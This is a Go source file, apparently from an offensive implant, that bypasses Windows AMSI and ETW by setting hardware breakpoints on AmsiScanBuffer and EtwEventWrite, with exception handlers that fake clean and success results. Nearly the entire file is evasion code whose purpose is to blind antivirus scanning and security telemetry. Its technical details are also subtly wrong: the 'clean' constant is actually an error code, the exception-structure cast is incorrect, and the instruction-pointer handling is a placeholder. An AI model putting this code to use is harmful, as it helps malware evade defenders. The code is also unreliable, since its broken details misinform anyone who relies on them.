//go:build windows && amd64

package main

// AMSI and ETW Bypass via Hardware Breakpoints
//
// This approach sets hardware execution breakpoints (DR0 + DR7) on the target
// function (AmsiScanBuffer for AMSI, EtwEventWrite for ETW). A Vectored
// Exception Handler (VEH) intercepts the SINGLE_STEP exception that fires
// when the breakpoint is hit. The VEH modifies the thread context to return
// a "clean" result (e.g., AMSI_RESULT_CLEAN for AMSI, STATUS_SUCCESS for ETW),
// then resumes execution without ever patching memory.
//
// Advantages over memory patching:
//   - No memory permission changes (no VirtualProtect calls)
//   - No code modification (nothing to scan for)
//   - Works even with kernel-mode ETW consumer protection
//
// Limitations:
//   - Requires the target function to be loaded in the process
//   - Only effective on the calling thread (other threads unaffected)
//   - Hardware breakpoint detection tools can discover DR0-DR3 usage
//
// NOTE: The full implementation requires assembly trampolines and careful
// thread context manipulation. These stubs provide the interface and can be
// completed with native code in a future iteration.

import (
	"runtime"
	"syscall"
	"unsafe"
)

const (
	hwbpAMSIResultClean uint32 = 0x80070057 // AMSI_RESULT_CLEAN
	hwbpETWSuccesStatus        = 0x00000000 // STATUS_SUCCESS

	contextAMD64     = 0x100000
	contextDebugRegs = 0x00000010
	hwbpSingleStep   = 0x80000004 // exception code for single-step

	dr7ExecEnable uint64 = 0x00000001 // Local enable for DR0
)

// hwbpContext mirrors the x64 CONTEXT structure (debug registers portion).
type hwbpContext struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       uint32
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
}

var (
	kernel32DLL          = syscall.NewLazyDLL("kernel32.dll")
	hwbpGetThreadCtx     = kernel32DLL.NewProc("GetThreadContext")
	hwbpSetThreadCtx     = kernel32DLL.NewProc("SetThreadContext")
	hwbpGetCurrentThread = kernel32DLL.NewProc("GetCurrentThread")
	hwbpAddVEH           = kernel32DLL.NewProc("AddVectoredExceptionHandler")
	hwbpRemoveVEH        = kernel32DLL.NewProc("RemoveVectoredExceptionHandler")
)

// hwbpVEHState holds the active hardware breakpoint configuration.
type hwbpVEHState struct {
	targetAddr  uintptr
	cleanResult uint64
	vehHandle   uintptr
	active      bool
}

var (
	hwbpAMSIState hwbpVEHState
	hwbpETWState  hwbpVEHState
)

// HardwareBreakpointAMSI sets a hardware execution breakpoint on AmsiScanBuffer.
// When the breakpoint fires, the VEH modifies EAX to return AMSI_RESULT_CLEAN.
func HardwareBreakpointAMSI() string {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := k32.NewProc("GetModuleHandleW")
	getProcAddress := k32.NewProc("GetProcAddress")

	namePtr, _ := syscall.UTF16PtrFromString("amsi.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "HWBP AMSI: amsi.dll not loaded"
	}

	procName := append([]byte("AmsiScanBuffer"), 0)
	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
	if procAddr == 0 {
		return "HWBP AMSI: AmsiScanBuffer not found"
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hThread, _, _ := hwbpGetCurrentThread.Call()

	var ctx hwbpContext
	ctx.ContextFlags = contextAMD64 | contextDebugRegs
	ret, _, _ := hwbpGetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return "HWBP AMSI: GetThreadContext failed"
	}

	ctx.Dr0 = uint64(procAddr)
	ctx.Dr7 |= dr7ExecEnable

	ret, _, _ = hwbpSetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return "HWBP AMSI: SetThreadContext failed"
	}

	// Register VEH to intercept the breakpoint exception
	cb := syscall.NewCallback(hwbpAMSIHandler)
	veh, _, _ := hwbpAddVEH.Call(1, cb)
	if veh == 0 {
		// Clean up DR0
		ctx.Dr0 = 0
		ctx.Dr7 &^= dr7ExecEnable
		hwbpSetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
		return "HWBP AMSI: AddVectoredExceptionHandler failed"
	}

	hwbpAMSIState = hwbpVEHState{
		targetAddr:  procAddr,
		cleanResult: uint64(hwbpAMSIResultClean),
		vehHandle:   veh,
		active:      true,
	}

	return "HWBP AMSI: hardware breakpoint set on AmsiScanBuffer (returns AMSI_RESULT_CLEAN)"
}

// hwbpAMSIHandler is the VEH callback for AMSI hardware breakpoint interception.
//
//go:uintptrescapes
func hwbpAMSIHandler(exceptionInfo uintptr) uintptr {
	if !hwbpAMSIState.active {
		return 0
	}

	// Map EXCEPTION_POINTERS to check for SINGLE_STEP from HW breakpoint
	rec := (*struct {
		code      uint32
		flags     uint32
		record    uintptr
		address   uintptr
		numParams uint32
		params    [15]uintptr
	})(unsafe.Pointer(exceptionInfo))

	if rec.code != hwbpSingleStep {
		return 0
	}

	// params[1] = CONTEXT record — map to hwbpContext for DR/RIP manipulation
	ctx := (*hwbpContext)(unsafe.Pointer(rec.params[1]))
	if ctx == nil {
		return 0
	}

	// Check if DR0 breakpoint was triggered
	if ctx.Dr6&1 == 0 {
		return 0
	}

	// Set return value to clean (EAX = AMSI_RESULT_CLEAN)
	ctx.Rax = uint64(hwbpAMSIState.cleanResult)

	// Skip the breakpoint instruction: advance RIP past the int3
	// The exact skip depends on the instruction that triggered the breakpoint.
	// For simplicity, skip 1 byte (int3) - actual implementation needs proper disassembly.
	ctx.Rip++

	// Clear breakpoint status and disable DR0
	ctx.Dr6 = 0
	ctx.Dr7 &^= dr7ExecEnable

	return 1
}

// HardwareBreakpointETW sets a hardware execution breakpoint on EtwEventWrite.
// When the breakpoint fires, the VEH modifies the return value to STATUS_SUCCESS.
func HardwareBreakpointETW() string {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := k32.NewProc("GetModuleHandleW")
	getProcAddress := k32.NewProc("GetProcAddress")

	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "HWBP ETW: ntdll.dll not loaded"
	}

	procName := append([]byte("EtwEventWrite"), 0)
	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
	if procAddr == 0 {
		return "HWBP ETW: EtwEventWrite not found"
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hThread, _, _ := hwbpGetCurrentThread.Call()

	var ctx hwbpContext
	ctx.ContextFlags = contextAMD64 | contextDebugRegs
	ret, _, _ := hwbpGetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return "HWBP ETW: GetThreadContext failed"
	}

	// Use DR1 for ETW (DR0 is for AMSI)
	ctx.Dr1 = uint64(procAddr)
	ctx.Dr7 |= (dr7ExecEnable << 2) // Enable DR1 (bits 2-3)

	ret, _, _ = hwbpSetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return "HWBP ETW: SetThreadContext failed"
	}

	// Register VEH to intercept the breakpoint exception
	cb := syscall.NewCallback(hwbpETWHandler)
	veh, _, _ := hwbpAddVEH.Call(1, cb)
	if veh == 0 {
		ctx.Dr1 = 0
		ctx.Dr7 &^= (dr7ExecEnable << 2)
		hwbpSetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
		return "HWBP ETW: AddVectoredExceptionHandler failed"
	}

	hwbpETWState = hwbpVEHState{
		targetAddr:  procAddr,
		cleanResult: hwbpETWSuccesStatus,
		vehHandle:   veh,
		active:      true,
	}

	return "HWBP ETW: hardware breakpoint set on EtwEventWrite (returns STATUS_SUCCESS)"
}

// hwbpETWHandler is the VEH callback for ETW hardware breakpoint interception.
//
//go:uintptrescapes
func hwbpETWHandler(exceptionInfo uintptr) uintptr {
	if !hwbpETWState.active {
		return 0
	}

	// Map EXCEPTION_POINTERS to check for SINGLE_STEP from HW breakpoint
	rec := (*struct {
		code      uint32
		flags     uint32
		record    uintptr
		address   uintptr
		numParams uint32
		params    [15]uintptr
	})(unsafe.Pointer(exceptionInfo))

	if rec.code != hwbpSingleStep {
		return 0
	}

	// params[1] = CONTEXT record — map to hwbpContext for DR/RIP manipulation
	ctx := (*hwbpContext)(unsafe.Pointer(rec.params[1]))
	if ctx == nil {
		return 0
	}

	// Check if DR1 breakpoint was triggered (bit 1 of DR6)
	if ctx.Dr6&2 == 0 {
		return 0
	}

	// Set return value to STATUS_SUCCESS (RAX = 0)
	ctx.Rax = uint64(hwbpETWState.cleanResult)

	// Advance RIP past the breakpoint instruction
	ctx.Rip++

	// Clear breakpoint status and disable DR1
	ctx.Dr6 = 0
	ctx.Dr7 &^= (dr7ExecEnable << 2)

	return 1
}

// RemoveHardwareBreakpoints cleans up any active hardware breakpoints.
func RemoveHardwareBreakpoints() string {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	hThread, _, _ := hwbpGetCurrentThread.Call()
	var ctx hwbpContext
	ctx.ContextFlags = contextAMD64 | contextDebugRegs

	ret, _, _ := hwbpGetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return "failed to get thread context"
	}

	// Clear all debug registers
	ctx.Dr0 = 0
	ctx.Dr1 = 0
	ctx.Dr2 = 0
	ctx.Dr3 = 0
	ctx.Dr6 = 0
	ctx.Dr7 = 0

	hwbpSetThreadCtx.Call(hThread, uintptr(unsafe.Pointer(&ctx)))

	// Remove VEH handlers
	if hwbpAMSIState.vehHandle != 0 {
		hwbpRemoveVEH.Call(hwbpAMSIState.vehHandle)
		hwbpAMSIState.active = false
		hwbpAMSIState.vehHandle = 0
	}
	if hwbpETWState.vehHandle != 0 {
		hwbpRemoveVEH.Call(hwbpETWState.vehHandle)
		hwbpETWState.active = false
		hwbpETWState.vehHandle = 0
	}

	return "hardware breakpoints removed"
}
